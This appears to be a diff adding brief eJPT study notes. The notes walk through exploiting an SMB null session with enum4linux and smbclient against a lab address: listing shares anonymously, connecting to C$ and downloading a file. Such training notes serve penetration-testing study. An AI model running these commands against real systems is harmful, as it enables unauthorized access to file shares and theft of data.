@@ -1,0 +1,17 @@
+[eJPT][enum4linux][smbclient]Null Session
+
+
+1) Use "enum4linux -n" to make sure if "<20>" exists:
+#enum4linux -n 192.168.1.10
+
+2) If "<20>" exists, it means Null Session could be exploited. Utilize the following command to get more details:
+#enum4linux 192.168.1.10
+
+3) If confirmed that Null Session exists, you can remotely list all share of the target:
+#smbclient -L WORKGROUP -I 192.168.1.10 -N -U ""
+
+4) You also can connect the remote server by applying the following command:
+#smbclient \\\\192.168.1.10\\c$ -N -U ""
+
+5) Download those files stored on the share drive:
+smb: \> get Congratulations.txt
